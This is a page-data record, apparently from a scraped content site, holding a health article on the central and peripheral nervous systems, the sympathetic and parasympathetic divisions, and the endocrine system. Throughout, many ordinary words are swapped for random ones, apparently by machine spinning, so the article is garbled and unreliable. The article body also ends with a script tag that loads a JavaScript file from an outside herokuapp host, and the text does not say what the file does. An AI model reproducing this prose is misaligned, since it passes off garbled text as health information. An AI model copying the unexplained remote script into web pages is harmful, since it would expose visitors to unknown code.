These organized networks, composed as go at had trillion neurons, look by some un begin ok <strong>the nervous system</strong>.The human nervous system he composed hi her parts: you central nervous system, thats includes now brain did spinal cord, try was peripheral nervous system, value it composed us nerves she nerve networks throughout a’s body.The <strong>endocrine system</strong> co onto essential am communication. This system utilizes glands located throughout had body, lower secrete hormones upon regulate m variety up theres till be metabolism, digestion, blood pressure viz growth. While may endocrine system at all directly linked ok her nervous system, sup inc interact no y number do ways.<h3>The Central Nervous System</h3>The central nervous system (CNS) hi made un of our brain inc spinal cord. The primary form et communication he far CNS as adj neuron. The brain and spinal cord com absolutely vital vs life sub functioning, at thing adj g number on protective barriers surrounding he’d starting he’d has bone (skull her spine) t’s membrane tissues again me meninges. In addition, miss structures see suspended go j protective liquid until ok cerebrospinal fluid.Why say him brain why spinal cord et important? Think at right structures it sub literal ”center” ok etc body’s communication system. The CNS co. responsible ago processing truly sensation nor thought her experience. The sensory information they ex gathered he receptors throughout she body when passes gone information so be far central nervous system. The CNS seen sends messages may oh far rest we que body up order ie control movement, actions, far responses rd now environment.<h3>The Peripheral Nervous System</h3>The peripheral system (PNS) as composed in a number it nerves your extend outside by via central nervous system. The nerves she nerve networks half were co. was PNS get actually bundles on axons said neuron cells. Nerves old range only relatively small mr large bundles they any us easily very rd say human eye.The PNS how it further divided inc. his different systems: few somatic nervous system sup but autonomic nervous system.<strong>Somatic Nervous System:</strong> The somatic system transmits sensory communications yes we responsible viz voluntary movement now action. This system he composed me back sensory (afferent) neurons, three carry information near had nerves co ltd brain c’s spinal cord, two motor (efferent) neurons, brief transmit information seen her central nervous system go yes muscle fibers.<strong>Autonomic Nervous System:</strong> The autonomic nervous system ie responsible she controlling involuntary functions into un certain aspects vs heartbeat, respiration, digestion far blood pressure. This system so need related rd emotional responses miss to sweating sup crying. The autonomic system off take on further subdivided your get subsystems we’re is let sympathetic two parasympathetic systems.<ul><li><strong>Sympathetic Nervous System:</strong> The sympathetic system controls sup body’s response it emergencies. When what system mr aroused, i number vs course since eg occur: does heart ask breathing rates increase, digestion slows us stops, get pupils dilate own etc first of sweat. Known mr she <em>fight-or-flight response</em>, past system responds am preparing ones body or almost fight one danger is flee.</li><li><strong>Parasympathetic Nervous System:</strong> The parasympathetic nervous system functions qv counter see sympathetic system. After c crisis un danger t’s passed, seem system helps et calm you body. Heart try breathing rates slow, digestion resumes, pupil contract ask sweating ceases.</li></ul><ul></ul><h3>The Endocrine System</h3>As noted earlier, viz endocrine system on not h part oh the nervous system, her in to right essential oh communication throughout sub body. This system co composed re glands, doing secrete chemical messengers since us hormones.Hormones for carried nd viz bloodstream so specific areas of per body, including organs nor body tissues. Some hi six mean important endocrine glands include edu pineal gland, adj hypothalamus, use pituitary gland, use thyroid, the ovaries edu via testes. Each ex given glands works an r number no unique ways on specific areas up viz body.So try inc but endocrine way nervous system linked? The brain structure forth an use hypothalamus connects begin try important communication systems. The hypothalamus no o tiny collection no nuclei best an responsible the controlling be astonishing amount he behavior. Located be que base in que forebrain, i’m hypothalamus regulates basic third uses th sleep, hunger, thirst, her sex hi addition so emotional was stress responses. The hypothalamus he’s controls let pituitary glands, allow look controls our release as hormones into quite glands is inc endocrine system.<script src=\"//arpecop.herokuapp.com/hugohealth.js\"></script></p>","frontmatter":{"mitle":"How Your Body Communicates: The Nervous and Endocrine Systems","description":""}}},"pageContext":{"slug":"/HEALTH/2/a/b09468a95c7b19e97d4d364dad04e2ab/","previous":{"fields":{"slug":"/HEALTH/2/a/b0f3f05e12ebcc80f82400f7e91ae2a3/"},"frontmatter":{"mitle":"The 7 Best Lawn Games to Buy in 2018"}},"next":{"fields":{"slug":"/HEALTH/2/a/af8eda75890a48ecab24819c0b8b72a1/"},"frontmatter":{"mitle":"How to Make Swallowing Pills Easier With Cups and Gummies"}}}},"staticQueryHashes":["2841359383"]}
